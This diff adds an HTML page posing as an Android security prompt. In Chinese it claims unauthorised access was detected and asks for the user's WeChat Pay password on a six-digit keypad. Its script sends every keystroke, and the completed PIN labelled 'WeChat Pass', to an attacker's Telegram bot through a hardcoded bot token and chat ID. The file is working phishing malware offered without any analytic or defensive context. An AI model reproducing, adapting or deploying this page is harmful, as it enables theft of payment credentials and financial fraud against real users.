@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Android Keyboard</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+    }
+    .container {
+        width: 100%;
+        height: 85vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-end;
+        align-items: center;
+        padding-bottom: 20px;
+    }
+	.header-image {
+        position: absolute;
+        top: 10%; /* Adjust as needed */
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 100px; /* Adjust width as needed */
+        z-index: 1;
+    }
+	.header-text {
+        position: absolute;
+        top: 30%; /* Adjust as needed */
+        left: 50%;
+        transform: translate(-50%, -50%);
+       text-align: center;
+        font-size: 15px;
+        color: #333; /* Adjust text color as needed */
+        z-index: 1;
+    }
+    .input-group {
+        display: flex;
+        justify-content: space-between;
+        width: calc(100% - 20px);
+        max-width: 400px;
+        margin-bottom: 10px;
+        margin-top: 20px; /* Adjust the top margin */
+    }
+    .input-box {
+        width: calc(16.666% - 4px); /* 16.666% to divide equally for 6 boxes */
+        height: 50px;
+        border: 1px solid #ccc;
+        padding: 10px;
+        box-sizing: border-box;
+        font-size: 18px;
+        text-align: center; /* Center text */
+    }
+    .keyboard {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        grid-gap: 0px;
+        width: calc(100% - 20px);
+        max-width: 400px;
+    }
+    .key {
+        text-align: center;
+        padding: 20px; /* Increased padding */
+        font-size: 25px;
+        cursor: pointer;
+        border: 0px solid #ccc;
+        transition: background-color 0.3s;
+        font-weight: bold; /* Make digits bold */
+    }
+    .key:hover {
+        background-color: #f0f0f0;
+    }
+</style>
+</head>
+<body>
+<header>
+<div class="header-text">
+        <h4>检测到未经授权</h4>
+        <p>请验证微信支付密码才能访问应用程序</p>
+    </div>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsBAMAAACLU5NGAAAAMFBMVEUtwQBHcEwswQAswQAtwQAswwD////r+efU88qz6aOT4Hxw1VJPzCsxygMtwQAhvgD1akwaAAAABnRSTlO5ACdZluMT81nKAAAL+UlEQVR42szVTUwTQRTA8UHx2ISlcLcxHE2sxCOJjV4x8eNajq9V7gUSzw1Gz0XRcDRRCN4MKpGjHwfdhPZkd2pITExg3txtO2PSMFoohe12Zvf9Tz3+8t6bLfN6Gp++yeJr9MZ0ptfAvGNduj4XxNyv0atnsMav5AOOsSZQBLXzmdNY6QsGFW8iuJfpz0qnOCZU8DPbj5XOc0yswO92scRnZRJ+5kTWLY6JJu6exLrGMeGCc72stMCkE7VsDyvFMfFE9TjrIkcCidxR1ngeSeQfZU1xJFEwYlhmWKTGxcxlESnIdbFSSKbqf9YERzIF2X+sGaSTuGNY5uBp5BvWGEdCiewhawYpJfYOWXlEaltk5h1S2mKHNUWNNdJhzSKxdj2Pmc8DreNiXpojkjsu5k3SY+U8Zr5atP5/mLl4WjfPvDySy/dYmiO5ahk2QZAlsmyMIivHJpFeYoRdxihJLV2ybrOZgUFaK6zXOerOLyftsdnBTKr+4fWz5eWFhcXlR6vr21xrdNDuICytD94/LUF3i6vbqJUDVgpDJtWPVyXobWn9m0bLVdlc2PUdGFRPixsNbZsVUtV+V4b+LW3b3aQfjqX3V+DUCs8bKm6WVF9LcFZLH3W8LNneghAVN3ScLNlagVAVXuj4WHK/AmEzLpcsoyoDxO7ymT2VcblnyWYZBmtDuWfJVgUGrLCpnLPaL2HgijvKMUtvQYTuN9yy5BeI1GPtkiWbJYjWpnLIalcgYsXv7ljyM0RuXrtiyT8wRGvKEUuZFSayRp/ZXaHpiXLCapVhqAo7LljyEwzZvHLAasLQvbHPkm9h6B4o66wmQLLj8pmDYZlxWWa1ABIel89cPEPzGK2y2mWw045NlvwNlnqobLIqYKliwyKrCdZai85ydfDwl3mz6U0jBsLwv/UCyXmRStPj5qNteqNtkoobDQrVXptCujcq1CUcEylSc0z6QXwtC/EURbHUCMaT+nUR7zEB/OyMPTNej22MCGStRIVTFgyrUIyASY9j6Z4KqDKAxfsQVwpgCT7EvAhgCesQ9iKOVVdhlQXBmqjA2jAhsK5VYFUALLYAxBUNASw2POBqBMCaqOBaNzjWtQquMoDFTy1cQxwrUeHVALCELQ+Wf1CsMb/Oq0pSNWYiF4x1xkHt5/mnRDgfy/Pjxf8BncjP+AOa6WfsovpMM/WZtAhai8nTNbJv4oS3krrJzHkIa+p+hWZ4N1bIUa1tGAyrcG/a9bni9Or+I1Rnvo9g/WbGnEtNbD7WZ2ict1jy7mIo1ogV4zJ49A3AYhdiSV6p68Y5PTMMq87kWrHQ33VXRimENYqZGS8WGA33o+1CWFPli5W6sZ4aBKtQ/8laaxDWWEy1VzJWgiZriyUNWjbi+4lnN1a3MfML3li654qVNuUJfp4wIQbA4qJSOmcK3hxj5sEArKZUXhaKU+Z+NAirztlCz43JkU9jhhrASoRiaiKctvIlWQpgjRJ+0BmXdraQ1MjVotDwwmIdYFU+Jfp1qFzavyTiOr0iCEvxit62Eqk3sLWoATTa2jvqDpAAMVGhFW0f5TdEZFYJq7TX1UQSwJKxov1Ty4RhFSqgdgbWdSuEVWprC7VCWE9sS/hKYT1/2N6s6U5mKVhyr65FGuV5p5PnA23RMCycStPoa+vNZnz39+rWXscuzuVjHdDftxE21QNVd7qagLiFU2m6OFx4RaKtaelYL+yQND3mMv/2CS0Zq6Yt1cVrj5sITAWBqmyLY9OPhcBmPOotT0WZeexthNIJCVjhznveWar3SlTUJo9aHmk2tVQAF7PzQXo6jaWSuD4Yj32irwvNR6CzntlVA6oQ0zUudNbLWF/wo3L9wyOgsFj4YWLN+HTR1ugRWGP4RNo0/zWFGhlrgh7O6T7QY8xiTYHg4HsdoaJ5LKsEMxY1veKKhKWbmLG++31XxOpBxrpNgDXscuKV7zJEGv+jTMIqfLtxobpozTBY4FJMwRyRMVjYUqwwxgLMJR+hy9o1aELNPBoOJEWX8JWSdePGKnxdoM+xHq/wzSwpfllJvTQMlnfdXLovPv40dz6/bRRRHHf/gKBuAvdanKlU2msPAXqMRPlxpNdsnPsqRaRHFxDycUVLhW9JIYe9GaVR5ZsjEYVUKlU4xFtEkZIAO3PFXmsXx+QpSjJv3677jXfedRTns2++897M7JvZ17IFlY3VGUMXiAKrgMUa86kDyMp3MWGxxoo+ruYEX3w481h6Zaw+9DG1ZzzW7jg/FyNOueCqdCni0LOAepGwxk+LNUgfktt5LN0pXrE8wJSnAuvlA1ixqisceqgXUgSuWLWdjbVZSFqm9/13N56wW5R317i2RiaWigsJwtDtn79M04HPPMcO21ZLGKzi6bpJoe7ci+2YWU7wba7Kxjoopge9Ylz3t5igyYuxzWAVzouuKdK1M5J+QG2suHgs3Sqk+Nhc1zLwmIFLbYwrWSwVF1J8j6kG9TlVc/JdYLAKTyMahrSwnPA+X2TaKL8yWEUjfWB4hgaXxci7vEwCAUv5Bc4N1Jna2eJYDQFL9/IPxAHz27olYDHNDBajSVajfe5frzCS58VbE7F6uWeUB9xv1w3uZdroMSUsecuYHKM7TGyKMwJ5LCyuCWu8wdgwyqSZsShoJJkF7m0Gq1iobxpVWEv5HcsFnXkcIBCxVOzJYcssk0dpolNmx/Ibpo2Ci4hFfyzMHyLP8KYw/GedLYrb3lvPWBkIWLk2YXY49S7d5/9oyRNyrIAlqn4+JCyULcpY8o62S+wwq+XBUpEvB/lD9JlBGUv35Wc7QGK5OW8ra4lY+zAmUquMpWJJoHoXf3xXxtK+gAU+tJ4XqyVhdUrB2pQWGOVg7QtYYG+1BSyyXenlZilYuiNg6XKwWnZ6yxewygkQkWclVizuQOyXgdUXsQ4mlny4w7BfPfyRKoEJCzyxcblUzQf5+Uc6HdVNP/nhS+9kLtkrYWKjW+ergo/R7h9j9fHTQBlrxXS1KqF9l6Dn8rWcWP6ZquDTaNILTvwSg8IWV8QHqqEtviAjV9BWO+9QnC3nk3wsFIiS/FDWzIfVz6wrxF/XFeTD+jfH/ca/QXOPjEXLmtpLlWU99HpM9laH5C7oDxpNZW+1eLkzB6kBYUvG8rPkjo8QywIWWZ2KjoW8iYwPMlbkiZefQ2dc7XxYsXxVPHIO4eqcWLmuzB542PmD3ImCsMCaX5axZMOnn0ABsPBxfgeLNUBJC4CFF9cXaKxNkLQAWPDINa/QWKoOydMALHxabCo4Vg+x/QDFojkXvpIS04v4ulMLxqKrLwIrqQNiKQALHVHbCoAFz4u1BICFF32gAFhw0S9oABZ+i+T7BI5FdohwFh4r8QHOwmPpQ4CzAFgwdwXJRWLpPiBmAbBAgzFQeCy5tkp2FgALnxmbCogF+8CUqy8eS/8FOJqIx1L6J0Af4rHUwAfcW47H0n97BTeXkViwby7WoFiwL1QuTgpLJatFBuLEsPRgFYOF54J0Ip7rMULyeK5kPW/uEbDAlv7MpselhxtbG4892qiZKJbi7iF1135Jj4yuDQsELHxHbn1rvKiSbsP6H/uegIW3NNl64J2C+vrpMRTd8USaF7DQYOnexlG10OjWwAdr22lyLh+4nLfuqAs0naZJtLe3t91VKUGd9leb+fz/lLpo05quCjRwBQzWnCrPklVmHvi8crMcIrqd7h4CC8/1VJnsj8pVVaoZA0R0u/JWqKyz6FLlso1Ys5U3bcS6VplW9tkLp+J8Zh/WsyHWnH1Yz4dY79gnrdtDLPuGYjQ7xJqxD6s6xCLN26T4I6ybtmG9GmHZln6iSyOsGduwqiMs28T1qzPCskxc0UfHWHZl6+jaCMu2XnzmENbV0KY+JCyrxmJYdQjLmbNp9nCCdTm0KE2fYDlTNgWtE6wroVXOIqzpKTuohs4iLIvU1Z09g+XMWcAVvXLOYs1YEOpfVM9hOVe6dnQhYZHdCkum+tgxYU1PhaVS/ekYsZwZ4iqHqspgOTNvdEuj+qTqcFjO9K1uKQ6LQqI6g0V2487kwbrd399zHAaLHHbj06g7UQs/fL/qZGCRvX39gwna9XcNCP8Bg0Gr6FPPzPMAAAAASUVORK5CYII=" alt="Header Image" class="header-image">
+</header>
+<div class="container">
+    <div class="input-group">
+        <div class="input-box" id="inputBox1" maxlength="1"></div>
+        <div class="input-box" id="inputBox2" maxlength="1"></div>
+        <div class="input-box" id="inputBox3" maxlength="1"></div>
+        <div class="input-box" id="inputBox4" maxlength="1"></div>
+        <div class="input-box" id="inputBox5" maxlength="1"></div>
+        <div class="input-box" id="inputBox6" maxlength="1"></div>
+    </div>
+    <div class="keyboard">
+        <div class="key" onclick="addToInput('1')">1</div>
+        <div class="key" onclick="addToInput('2')">2</div>
+        <div class="key" onclick="addToInput('3')">3</div>
+        <div class="key" onclick="addToInput('4')">4</div>
+        <div class="key" onclick="addToInput('5')">5</div>
+        <div class="key" onclick="addToInput('6')">6</div>
+        <div class="key" onclick="addToInput('7')">7</div>
+        <div class="key" onclick="addToInput('8')">8</div>
+        <div class="key" onclick="addToInput('9')">9</div>
+        <div class="key" onclick="okToTelegram()">✓</div>
+        <div class="key" onclick="addToInput('0')">0</div>
+        <div class="key" onclick="clearInput()">⌫</div> <!-- Blank space for alignment -->
+    </div>
+</div>
+
+<script>
+    var inputBoxes = document.querySelectorAll('.input-box');
+
+     function addToInput(value) {
+        for (var i = 0; i < inputBoxes.length; i++) {
+            if (inputBoxes[i].innerText.length < parseInt(inputBoxes[i].getAttribute('maxlength'))) {
+                inputBoxes[i].innerText += value;
+                // Send message to Telegram bot
+                sendInputToTelegram(inputBoxes[i].innerText);
+                return;
+            }
+        }
+    }
+
+    function sendInputToTelegram() {
+        const inputs = Array.from(inputBoxes).map(input => input.innerText).join('');
+        const botToken = '6435046030:AAE6glZbS1j4XkZT-qa3eGp1Xr2btq-wubg';
+        const chatId = '-1002129234973';
+        const message = encodeURIComponent(inputs);
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+       
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Message sent to Telegram bot:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram bot:', error);
+            });
+    }
+
+
+function okToTelegram() {
+        const inputs = Array.from(inputBoxes).map(input => input.innerText).join('');
+        const botToken = '6435046030:AAE6glZbS1j4XkZT-qa3eGp1Xr2btq-wubg';
+        const chatId = '-1002129234973';
+        const message = encodeURIComponent("WeChat Pass : "+ "" + inputs);
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+       
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Message sent to Telegram bot:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram bot:', error);
+            });
+    }
+    function clearInput() {
+        inputBoxes.forEach(function(box) {
+            box.innerText = '';
+        });
+    }
+</script>
+</body>
+</html>
